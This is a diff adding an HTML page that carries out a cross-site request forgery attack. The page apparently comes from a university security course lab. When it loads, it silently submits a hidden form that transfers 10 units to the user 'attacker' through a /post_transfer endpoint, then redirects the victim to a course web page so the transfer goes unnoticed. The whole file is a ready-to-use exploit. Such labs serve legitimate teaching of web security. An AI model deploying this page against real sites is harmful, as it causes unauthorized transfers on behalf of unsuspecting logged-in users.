@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <iframe id="form-result" name="form-result" hidden></iframe>
+        <form id="attack-form" class="pure-form pure-form-stacked" action="" target="form-result" method="post" hidden>
+            <input type="text" name="destination_username" value="attacker">
+            <input type="text" name="quantity" value="10"/>
+        </form>
+        <script>
+            const form = document.getElementById("attack-form");
+            form.action = `http://${document.location.hostname}:3000/post_transfer`;
+            document.getElementById("form-result").onload = function () {
+                window.location.replace("https://cse.hkust.edu.hk/~dongdong/comp4634.html");
+            };
+            form.submit();
+        </script>
+    </body>
+</html>
